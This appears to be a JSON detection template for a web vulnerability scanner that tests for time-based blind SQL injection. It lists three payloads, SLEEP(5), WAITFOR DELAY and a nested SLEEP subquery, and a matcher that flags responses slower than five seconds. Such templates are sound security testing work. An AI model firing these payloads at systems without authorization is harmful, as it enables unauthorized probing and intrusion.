  {
    "id": "sqli-advanced",
    "info": {
      "name": "SQL Injection - Advanced Techniques",
      "severity": "critical",
      "category": "injection",
      "description": "Advanced SQL injection with time-based and boolean-based tests",
      "references": [
        "https://owasp.org/www-community/attacks/SQL_Injection"
      ],
      "tags": [
        "sqli",
        "injection",
        "blind"
      ]
    },
    "payloads": [
      {
        "value": "1' AND SLEEP(5)--",
        "encoding": "none",
        "method": "GET"
      },
      {
        "value": "1' WAITFOR DELAY '0:0:5'--",
        "encoding": "none",
        "method": "GET"
      },
      {
        "value": "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "encoding": "none",
        "method": "GET"
      }
    ],
    "matchers": [
      {
        "type": "response_time",
        "condition": "greater_than",
        "patterns": [
          "5000"
        ]
      }
    ]
  }
